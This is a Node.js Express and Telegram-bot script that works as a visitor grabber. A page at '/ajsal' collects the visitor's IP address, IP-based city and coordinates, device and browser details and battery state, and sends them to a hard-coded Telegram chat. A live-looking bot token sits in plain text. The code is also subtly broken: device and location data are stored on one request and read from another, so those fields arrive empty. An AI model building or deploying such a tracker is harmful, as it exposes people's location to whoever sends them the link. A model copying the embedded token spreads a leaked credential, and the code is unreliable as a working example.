const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

// Bot token
const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// Define Telegram ID for user to send messages
const ajsal = '6524787237';

// Create an express app
const app = express();
app.use(express.json());

// Helper Functions
function getDeviceName(userAgent) {
  const ua = userAgent.toLowerCase();

  if (ua.includes('mobile') || ua.includes('android')) {
    return 'Mobile';
  } else if (ua.includes('ipad') || ua.includes('tablet')) {
    return 'Tablet';
  } else if (ua.includes('macintosh') || ua.includes('windows')) {
    return 'Desktop';
  } else {
    return 'Unknown';
  }
}

function getOSVersion(userAgent) {
  const osVersion = (userAgent.match(/(iPhone|iPad|iPod|Android|Windows|Macintosh)\s([0-9._]+)/) || [])[2];
  return osVersion || "Unknown";
}

function getBrowserVersion(userAgent) {
  const regex = /(?:MSIE|Edge|Opera|Firefox|Chrome|Safari)[\/\s](\d+\.\d+)/;
  const match = userAgent.match(regex);
  return match ? match[1] : "unknown";
}

async function fetchUserData(ip) {
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    return response.data;
  } catch (error) {
    console.error('Error fetching IP API data:', error.message);
    return null;
  }
}

// Route `/ajsal`
app.get('/ajsal', async (req, res) => {
  const userAgent = req.headers['user-agent'];
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Get device info
  const deviceName = getDeviceName(userAgent);
  const osVersion = getOSVersion(userAgent);
  const browserVersion = getBrowserVersion(userAgent);

  // Fetch user location data
  const userData = await fetchUserData(userIp);

  // HTML response
  const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Device, Location & Battery Info</title>
    </head>
    <body>
      <h1>Sending Your Info</h1>
      <p>Your device, location, and battery info will be sent shortly.</p>
      <script>
        async function sendBatteryInfo() {
          try {
            const battery = await navigator.getBattery();
            const batteryInfo = {
              level: (battery.level * 100) + '%',
              charging: battery.charging ? 'Charging' : 'Not Charging'
            };

            // Send battery info to the server
            fetch('/send-info', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(batteryInfo)
            });
          } catch (error) {
            console.error('Failed to get battery info:', error);
          }
        }

        sendBatteryInfo();
      </script>
    </body>
    </html>
  `;

  res.send(html);

  // Save device and location info for later use
  req.deviceInfo = { deviceName, osVersion, browserVersion };
  req.userData = userData;
});

// Handle battery and combined data
app.post('/send-info', async (req, res) => {
  const { level, charging } = req.body;

  // Retrieve stored device and location info
  const deviceInfo = req.deviceInfo || {};
  const userData = req.userData || {};

  // Combine all info
  const message = `
🌐 *Device Info*:
- Device: ${deviceInfo.deviceName || 'Unknown'}
- OS Version: ${deviceInfo.osVersion || 'Unknown'}
- Browser: ${deviceInfo.browserVersion || 'Unknown'}

📍 *Location Info*:
- IP Address: ${userData.ip || 'Unknown'}
- City: ${userData.city || 'Unknown'}
- Region: ${userData.region || 'Unknown'}
- Country: ${userData.country_name || 'Unknown'}
- Latitude: ${userData.latitude || 'Unknown'}
- Longitude: ${userData.longitude || 'Unknown'}
- ISP: ${userData.org || 'Unknown'}

🔋 *Battery Info*:
- Level: ${level || 'Unknown'}
- Status: ${charging || 'Unknown'}
`;

  // Send the information to Telegram
  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });

  res.status(200).send('Info sent to Telegram.');
});

// Start the server
app.listen(process.env.PORT || 3000, () => {
  console.log(`Server is running on port ${process.env.PORT || 3000}`);
});
